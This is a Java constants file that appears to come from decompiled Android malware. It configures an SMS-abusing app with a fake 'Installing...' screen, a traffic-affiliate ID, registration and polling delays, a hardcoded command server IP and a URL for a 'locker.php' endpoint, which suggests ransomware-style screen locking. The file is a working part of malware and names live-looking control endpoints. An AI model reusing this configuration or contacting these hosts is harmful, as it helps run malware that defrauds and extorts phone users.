package com.address.core;

public class Consts {
    public static final int BROWSER = 2;
    public static final int MODE_MULTI = 2;
    public static final int MODE_STANDALONE = 1;
    public static final int REGMODE_DELAY = 2;
    public static final int REGMODE_ONCE_INSTALLED = 1;
    public static final int SCRIPT = 3;
    public static final int SMS_STATUS_DELIVERED = 2;
    public static final int SMS_STATUS_ERROR = 3;
    public static final int SMS_STATUS_SENT = 1;
    public static final int STANDARD_BROWSER = 1;
    public static String activityName;
    public static int groupName;
    public static Boolean locker;
    public static String lockerAddress;
    public static int queryDelay;
    public static int registrationDelay;
    public static String serverAddress;
    public static int trafferName;
    public static String userAgent;
    public static String version;

    static {
        activityName = null;
        trafferName = 0;
        groupName = 0;
        version = null;
        userAgent = null;
        serverAddress = null;
        locker = Boolean.valueOf(false);
        lockerAddress = null;
        registrationDelay = 0;
        queryDelay = 0;
        activityName = "Установка...";
        trafferName = 1;
        groupName = 5;
        version = "1.2";
        userAgent = "xxx";
        registrationDelay = 30;
        queryDelay = 30;
        serverAddress = "81.94.205.226";
        locker = Boolean.valueOf(false);
        lockerAddress = "http://23.227.163.110/locker.php";
    }
}
